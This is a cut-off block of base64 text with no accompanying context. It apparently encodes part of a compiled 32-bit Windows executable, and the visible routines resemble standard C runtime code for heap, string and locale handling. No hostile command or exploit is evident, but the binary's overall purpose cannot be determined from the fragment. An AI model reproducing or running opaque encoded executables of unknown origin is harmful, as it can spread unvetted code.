QQBbX17Jw6F0K0EAVos1ZCtBAFcz/zvwdTSDwBBrwBRQ/zVoK0EAV/81pChBAP8VGOFAADvHdQQzwOt4gwV0K0EAEIs1ZCtBAKNoK0EAa/YUAzVoK0EAaMRBAABqCP81pChBAP8VEOFAAIlGEDvHdMdqBGgAIAAAaAAAEABX/xUU4UAAiUYMO8d1Ev92EFf/NaQoQQD/FXzgQADrm4NOCP+JPol+BP8FZCtBAItGEIMI/4vGX17Di/9Vi+xRUYtNCItBCFNWi3EQVzPb6wMDwEOFwH35i8NpwAQCAACNhDBEAQAAaj+JRfhaiUAIiUAEg8AISnX0agSL+2gAEAAAwecPA3kMaACAAABX/xUU4UAAhcB1CIPI/+mdAAAAjZcAcAAAiVX8O/p3Q4vKK8/B6QyNRxBBg0j4/4OI7A8AAP+NkPwPAACJEI2Q/O///8dA/PAPAACJUATHgOgPAADwDwAABQAQAABJdcuLVfyLRfgF+AEAAI1PDIlIBIlBCI1KDIlICIlBBINknkQAM/9HibyexAAAAIpGQ4rI/sGEwItFCIhOQ3UDCXgEugAAAICLy9Pq99IhUAiLw19eW8nDi/9Vi+yD7AyLTQiLQRBTVot1EFeLfQyL1ytRDIPGF8HqD4vKackEAgAAjYwBRAEAAIlN9ItP/IPm8Ek78Y18OfyLH4lNEIld/A+OVQEAAPbDAQ+FRQEAAAPZO/MPjzsBAACLTfzB+QRJiU34g/k/dgZqP1mJTfiLXwQ7Xwh1Q7sAAACAg/kgcxrT64tN+I1MAQT30yFckET+CXUmi00IIRnrH4PB4NPri034jUwBBPfTIZyQxAAAAP4JdQaLTQghWQSLTwiLXwSJWQSLTwSLfwiJeQiLTRArzgFN/IN9/AAPjqUAAACLffyLTQzB/wRPjUwx/IP/P3YDaj9fi130jRz7iV0Qi1sEiVkEi10QiVkIiUsEi1kEiUsIi1kEO1kIdVeKTAcEiE0T/sGITAcEg/8gcxyAfRMAdQ6Lz7sAAACA0+uLTQgJGY1EkESLz+sggH0TAHUQjU/guwAAAIDT64tNCAlZBI2EkMQAAACNT+C6AAAAgNPqCRCLVQyLTfyNRDL8iQiJTAH86wOLVQyNRgGJQvyJRDL46TwBAAAzwOk4AQAAD40vAQAAi10MKXUQjU4BiUv8jVwz/It1EMH+BE6JXQyJS/yD/j92A2o/XvZF/AEPhYAAAACLdfzB/gROg/4/dgNqP16LTwQ7Twh1QrsAAACAg/4gcxmLztPrjXQGBPfTIVyQRP4OdSOLTQghGescjU7g0+uNTAYE99MhnJDEAAAA/gl1BotNCCFZBItdDItPCIt3BIlxBIt3CItPBIlxCIt1EAN1/Il1EMH+BE6D/j92A2o/XotN9I0M8Yt5BIlLCIl7BIlZBItLBIlZCItLBDtLCHVXikwGBIhND/7BiEwGBIP+IHMcgH0PAHUOi86/AAAAgNPvi00ICTmNRJBEi87rIIB9DwB1EI1O4L8AAACA0++LTQgJeQSNhJDEAAAAjU7gugAAAIDT6gkQi0UQiQOJRBj8M8BAX15bycOL/1WL7IPsFKFkK0EAi00Ia8AUAwVoK0EAg8EXg+HwiU3wwfkEU0mD+SBWV30Lg87/0+6DTfj/6w2DweCDyv8z9tPqiVX4iw1wK0EAi9nrEYtTBIs7I1X4I/4L13UKg8MUiV0IO9hy6DvYdX+LHWgrQQDrEYtTBIs7I1X4I/4L13UKg8MUiV0IO9ly6DvZdVvrDIN7CAB1CoPDFIldCDvYcvA72HUxix1oK0EA6wmDewgAdQqDwxSJXQg72XLwO9l1Feig+v//i9iJXQiF23UHM8DpCQIAAFPoOvv//1mLSxCJAYtDEIM4/3TliR1wK0EAi0MQixCJVfyD+v90FIuMkMQAAACLfJBEI034I/4Lz3Upg2X8AIuQxAAAAI1IRIs5I1X4I/4L13UO/0X8i5GEAAAAg8EE6+eLVfyLymnJBAIAAI2MAUQBAACJTfSLTJBEM/8jznUSi4yQxAAAACNN+GogX+sDA8lHhcl9+YtN9ItU+QSLCitN8Ivxwf4EToP+P4lN+H4Daj9eO/cPhAEBAACLSgQ7Sgh1XIP/ILsAAACAfSaLz9Pri038jXw4BPfTiV3sI1yIRIlciET+D3Uzi03si10IIQvrLI1P4NPri038jYyIxAAAAI18OAT30yEZ/g+JXex1C4tdCItN7CFLBOsDi10Ig334AItKCIt6BIl5BItKBIt6CIl5CA+EjQAAAItN9I0M8Yt5BIlKCIl6BIlRBItKBIlRCItKBDtKCHVeikwGBIhNC/7Bg/4giEwGBH0jgH0LAHULvwAAAICLztPvCTuLzr8AAACA0++LTfwJfIhE6ymAfQsAdQ2NTuC/AAAAgNPvCXsEi038jbyIxAAAAI1O4L4AAACA0+4JN4tN+IXJdAuJColMEfzrA4tN+It18APRjU4BiQqJTDL8i3X0iw6NeQGJPoXJdRo7HUgqQQB1EotN/DsNeCtBAHUHgyVIKkEAAItN/IkIjUIEX15bycNqCGh4/UAA6LSL///o5Ln//4tAeIXAdBaDZfwA/9DrBzPAQMOLZejHRfz+////6NYfAADozYv//8No3KdAAOjrtv//WaNMKkEAw4v/VYvsUVNWV/81qCxBAOhLt////zWkLEEAi/iJffzoO7f//4vwWVk79w+CgwAAAIveK9+NQwSD+ARyd1folCAAAIv4jUMEWTv4c0i4AAgAADv4cwKLxwPHO8dyD1D/dfzodcv//1lZhcB1Fo1HEDvHckBQ/3X86F/L//9ZWYXAdDHB+wJQjTSY6Fa2//9Zo6gsQQD/dQjoSLb//4kGg8YEVug9tv//WaOkLEEAi0UIWesCM8BfXlvJw4v/VmoEaiDoycr//4vwVugWtv//g8QMo6gsQQCjpCxBAIX2dQVqGFhew4MmADPAXsNqDGiY/UAA6H+K///o56n//4Nl/AD/dQjo+P7//1mJReTHRfz+////6AkAAACLReTom4r//8Poxqn//8OL/1WL7P91COi3////99gbwPfYWUhdw4v/VYvsi0UIo1AqQQCjVCpBAKNYKkEAo1wqQQBdw4v/VYvsi0UIiw3MFUEAVjlQBHQPi/Fr9gwDdQiDwAw7xnLsa8kMA00IXjvBcwU5UAR0AjPAXcP/NVgqQQDowbX//1nDaiBouP1AAOjKif//M/+JfeSJfdiLXQiD+wt/THQVi8NqAlkrwXQiK8F0CCvBdGQrwXVE6Fq3//+L+Il92IX/dRSDyP/pYQEAAL5QKkEAoVAqQQDrYP93XIvT6F3///+L8IPGCIsG61qLw4PoD3Q8g+gGdCtIdBzoO33//8cAFgAAADPAUFBQUFDowXz//4PEFOuuvlgqQQChWCpBAOsWvlQqQQChVCpBAOsKvlwqQQChXCpBAMdF5AEAAABQ6P20//+JReBZM8CDfeABD4TYAAAAOUXgdQdqA+h/qv//OUXkdAdQ6NDc//9ZM8CJRfyD+wh0CoP7C3QFg/sEdRuLT2CJTdSJR2CD+wh1QItPZIlN0MdHZIwAAACD+wh1LosNwBVBAIlN3IsNxBVBAIsVwBVBAAPKOU3cfRmLTdxryQyLV1yJRBEI/0Xc69voZbT//4kGx0X8/v///+gVAAAAg/sIdR//d2RT/1XgWesZi10Ii33Yg33kAHQIagDoXtv//1nDU/9V4FmD+wh0CoP7C3QFg/sEdRGLRdSJR2CD+wh1BotF0IlHZDPA6GyI///Di/9Vi+yLRQijZCpBAF3Di/9Vi+yLRQijcCpBAF3Di/9Vi+yLRQijdCpBAF3Di/9Vi+z/NXQqQQDo0rP//1mFwHQP/3UI/9BZhcB0BTPAQF3DM8Bdw4v/VYvsg+wUU1ZX6KGz//+DZfwAgz14KkEAAIvYD4WOAAAAaCDqQAD/FRzhQACL+IX/D4QqAQAAizWE4EAAaBTqQABX/9aFwA+EFAEAAFDo67L//8cEJATqQABXo3gqQQD/1lDo1rL//8cEJPDpQABXo3wqQQD/1lDowbL//8cEJNTpQABXo4AqQQD/1lDorLL//1mjiCpBAIXAdBRovOlAAFf/1lDolLL//1mjhCpBAKGEKkEAO8N0TzkdiCpBAHRHUOjysv///zWIKkEAi/Do5bL//1lZi/iF9nQshf90KP/WhcB0GY1N+FFqDI1N7FFqAVD/14XAdAb2RfQBdQmBTRAAACAA6zmhfCpBADvDdDBQ6KKy//9ZhcB0Jf/QiUX8hcB0HKGAKkEAO8N0E1DohbL//1mFwHQI/3X8/9CJRfz/NXgqQQDobbL//1mFwHQQ/3UQ/3UM/3UI/3X8/9DrAjPAX15bycOL/1WL7ItFCFMz21ZXO8N0B4t9DDv7dxvoLHr//2oWXokwU1NTU1PotXn//4PEFIvG6zyLdRA783UEiBjr2ovQOBp0BEJPdfg7+3Tuig6ICkJGOst0A0918zv7dRCIGOjlef//aiJZiQiL8eu1M8BfXltdw4v/VYvsU1aLdQgz21c5XRR1EDvzdRA5XQx1EjPAX15bXcM783QHi30MO/t3G+ijef//ahZeiTBTU1NTU+gsef//g8QUi8br1TldFHUEiB7ryotVEDvTdQSIHuvRg30U/4vGdQ+KCogIQEI6y3QeT3Xz6xmKCogIQEI6y3QIT3QF/00Ude45XRR1AogYO/t1i4N9FP91D4tFDGpQiFwG/1jpeP///4ge6Cl5//9qIlmJCIvx64KL/1WL7ItNCFMz21ZXO8t0B4t9DDv7dxvoA3n//2oWXokwU1NTU1PojHj//4PEFIvG6zCLdRA783UEiBnr2ovRigaIAkJGOsN0A0918zv7dRCIGejIeP//aiJZiQiL8evBM8BfXltdw4v/VYvsi00IVjP2O858HoP5An4Mg/kDdRShCCBBAOsooQggQQCJDQggQQDrG+iGeP//VlZWVlbHABYAAADoDnj//4PEFIPI/15dw4v/VYvsi1UIU1ZXM/8713QHi10MO993HuhQeP//ahZeiTBXV1dXV+jZd///g8QUi8ZfXltdw4t1EDv3dQczwGaJAuvUi8oPtwZmiQFBQUZGZjvHdANLde4zwDvfddNmiQLoB3j//2oiWYkIi/Hrs4v/VYvsi0UIZosIQEBmhcl19itFCNH4SF3Di/9Vi+yLRQiFwHQSg+gIgTjd3QAAdQdQ6D+g//9ZXcPMi/9Vi+yD7BShBBBBADPFiUX8U1Yz21eL8TkdjCpBAHU4U1Mz/0dXaCzqQABoAAEAAFP/FSThQACFwHQIiT2MKkEA6xX/FRjgQACD+Hh1CscFjCpBAAIAAAA5XRR+IotNFItFEEk4GHQIQDvLdfaDyf+LRRQrwUg7RRR9AUCJRRShjCpBAIP4Ag+ErAEAADvDD4SkAQAAg/gBD4XMAQAAiV34OV0gdQiLBotABIlFIIs1ZOBAADPAOV0kU1P/dRQPlcD/dRCNBMUBAAAAUP91IP/Wi/g7+w+EjwEAAH5DauAz0lj394P4AnI3jUQ/CD0ABAAAdxPo7BoAAIvEO8N0HMcAzMwAAOsRUOi9CwAAWTvDdAnHAN3dAACDwAiJRfTrA4ld9Dld9A+EPgEAAFf/dfT/dRT/dRBqAf91IP/WhcAPhOMAAACLNSThQABTU1f/dfT/dQz/dQj/1ovIiU34O8sPhMIAAAD3RQwABAAAdCk5XRwPhLAAAAA7TRwPj6cAAAD/dRz/dRhX/3X0/3UM/3UI/9bpkAAAADvLfkVq4DPSWPfxg/gCcjmNRAkIPQAEAAB3FugtGgAAi/Q783RqxwbMzAAAg8YI6xpQ6PsKAABZO8N0CccA3d0AAIPACIvw6wIz9jvzdEH/dfhWV/919P91DP91CP8VJOFAAIXAdCJTUzldHHUEU1PrBv91HP91GP91+FZT/3Ug/xVw4EAAiUX4Vui3/f//Wf919Oiu/f//i0X4WelZAQAAiV30iV3wOV0IdQiLBotAFIlFCDldIHUIiwaLQASJRSD/dQjogxcAAFmJReyD+P91BzPA6SEBAAA7RSAPhNsAAABTU41NFFH/dRBQ/3Ug6KEXAACDxBiJRfQ7w3TUizUg4UAAU1P/dRRQ/3UM/3UI/9aJRfg7w3UHM/bptwAAAH49g/jgdziDwAg9AAQAAHcW6BcZAACL/Dv7dN3HB8zMAACDxwjrGlDo5QkAAFk7w3QJxwDd3QAAg8AIi/jrAjP/O/t0tP91+FNX6D6R//+DxAz/dfhX/3UU/3X0/3UM/3UI/9aJRfg7w3UEM/brJf91HI1F+P91GFBX/3Ug/3Xs6PAWAACL8Il18IPEGPfeG/YjdfhX6Iz8//9Z6xr/dRz/dRj/dRT/dRD/dQz/dQj/FSDhQACL8Dld9HQJ/3X06L6c//9Zi0XwO8N0DDlFGHQHUOirnP//WYvGjWXgX15bi038M83oY2X//8nDi/9Vi+yD7BD/dQiNTfDoV3b///91KI1N8P91JP91IP91HP91GP91FP91EP91DOgo/P//g8QggH38AHQHi034g2Fw/cnDi/9Vi+xRUaEEEEEAM8WJRfyhkCpBAFNWM9tXi/k7w3U6jUX4UDP2RlZoLOpAAFb/FSzhQACFwHQIiTWQKkEA6zT/FRjgQACD+Hh1CmoCWKOQKkEA6wWhkCpBAIP4Ag+EzwAAADvDD4THAAAAg/gBD4XoAAAAiV34OV0YdQiLB4tABIlFGIs1ZOBAADPAOV0gU1P/dRAPlcD/dQyNBMUBAAAAUP91GP/Wi/g7+w+EqwAAAH48gf/w//9/dzSNRD8IPQAEAAB3E+gwFwAAi8Q7w3QcxwDMzAAA6xFQ6AEIAABZO8N0CccA3d0AAIPACIvYhdt0aY0EP1BqAFPoXI///4PEDFdT/3UQ/3UMagH/dRj/1oXAdBH/dRRQU/91CP8VLOFAAIlF+FPoyPr//4tF+FnrdTP2OV0cdQiLB4tAFIlFHDldGHUIiweLQASJRRj/dRzopBQAAFmD+P91BDPA60c7RRh0HlNTjU0QUf91DFD/dRjozBQAAIvwg8QYO/N03Il1DP91FP91EP91DP91CP91HP8VKOFAAIv4O/N0B1borJr//1mLx41l7F9eW4tN/DPN6GRj///Jw4v/VYvsg+wQ/3UIjU3w6Fh0////dSSNTfD/dSD/dRz/dRj/dRT/dRD/dQzoFv7//4PEHIB9/AB0B4tN+INhcP3Jw4v/VYvsVot1CIX2D4SBAQAA/3YE6Dya////dgjoNJr///92DOgsmv///3YQ6CSa////dhToHJr///92GOgUmv///zboDZr///92IOgFmv///3Yk6P2Z////dijo9Zn///92LOjtmf///3Yw6OWZ////djTo3Zn///92HOjVmf///3Y46M2Z////djzoxZn//4PEQP92QOi6mf///3ZE6LKZ////dkjoqpn///92TOiimf///3ZQ6JqZ////dlTokpn///92WOiKmf///3Zc6IKZ////dmDoepn///92ZOhymf///3Zo6GqZ////dmzoYpn///92cOhamf///3Z06FKZ////dnjoSpn///92fOhCmf//g8RA/7aAAAAA6DSZ////toQAAADoKZn///+2iAAAAOgemf///7aMAAAA6BOZ////tpAAAADoCJn///+2lAAAAOj9mP///7aYAAAA6PKY////tpwAAADo55j///+2oAAAAOjcmP///7akAAAA6NGY////tqgAAADoxpj//4PELF5dw4v/VYvsVot1CIX2dDWLBjsFeB5BAHQHUOijmP//WYtGBDsFfB5BAHQHUOiRmP//WYt2CDs1gB5BAHQHVuh/mP//WV5dw4v/VYvsVot1CIX2dH6LRgw7BYQeQQB0B1DoXZj//1mLRhA7BYgeQQB0B1DoS5j//1mLRhQ7BYweQQB0B1DoOZj//1mLRhg7BZAeQQB0B1DoJ5j//1mLRhw7BZQeQQB0B1DoFZj//1mLRiA7BZgeQQB0B1DoA5j//1mLdiQ7NZweQQB0B1bo8Zf//1leXcPMzMzMzMzMzFWL7FYzwFBQUFBQUFBQi1UMjUkAigIKwHQJg8IBD6sEJOvxi3UIg8n/jUkAg8EBigYKwHQJg8YBD6MEJHPui8GDxCBeycPMzMzMzMzMzMzMi1QkBItMJAj3wgMAAAB1PIsCOgF1LgrAdCY6YQF1JQrkdB3B6BA6QQJ1GQrAdBE6YQN1EIPBBIPCBArkddKL/zPAw5AbwNHgg8ABw/fCAQAAAHQYigKDwgE6AXXng8EBCsB03PfCAgAAAHSkZosCg8ICOgF1zgrAdMY6YQF1xQrkdL2DwQLriMzMzMzMzMzMVYvs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